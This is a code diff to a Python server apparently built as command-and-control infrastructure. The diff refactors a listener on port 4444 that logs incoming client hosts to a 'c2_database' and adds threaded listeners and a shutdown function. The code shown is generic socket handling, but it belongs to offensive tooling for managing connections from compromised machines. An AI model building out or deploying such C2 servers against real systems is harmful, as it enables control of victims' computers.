@@ -12,8 +12,10 @@ db_config = load_config().get("db_config", {
     "database": "c2_database",
 })
 
-# Global list to maintain connected clients
+# Global list to maintain connected clients and listener threads
 connected_clients = []
+listener_threads = []
+listener_sockets = []
 
 # Database connection
 def get_db_connection():
@@ -69,14 +71,46 @@ def start_listener(host="0.0.0.0", port=4444):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((host, port))
     server.listen(5)
+    listener_sockets.append(server)
+
     print(f"[INFO] Listener started on {host}:{port}")
 
-    while True:
-        client_socket, client_address = server.accept()
-        print(f"[INFO] Connection established with {client_address}")
-        connected_clients.append((client_socket, client_address))
-        save_host_to_db(client_address[0], client_address[1])
-        threading.Thread(target=handle_client, args=(client_socket, client_address)).start()
+    def accept_connections():
+        while True:
+            try:
+                client_socket, client_address = server.accept()
+                print(f"[INFO] Connection established with {client_address}")
+                connected_clients.append((client_socket, client_address))
+                save_host_to_db(client_address[0], client_address[1])
+                threading.Thread(target=handle_client, args=(client_socket, client_address)).start()
+            except OSError:
+                print(f"[INFO] Listener on {host}:{port} has been stopped.")
+                break
+
+    thread = threading.Thread(target=accept_connections, daemon=True)
+    listener_threads.append(thread)
+    thread.start()
+
+# Stop listeners
+def stop_listeners():
+    """
+    Stop all active listeners.
+    """
+    for server_socket in listener_sockets:
+        try:
+            server_socket.close()
+            print("[INFO] Listener socket closed.")
+        except Exception as e:
+            print(f"[ERROR] Failed to close listener: {e}")
+
+    for thread in listener_threads:
+        if thread.is_alive():
+            print("[INFO] Stopping listener thread.")
+            thread.join(timeout=1)
+
+    listener_sockets.clear()
+    listener_threads.clear()
+    print("[INFO] All listeners have been stopped.")
 
 # Handle client communication
 def handle_client(client_socket, client_address):
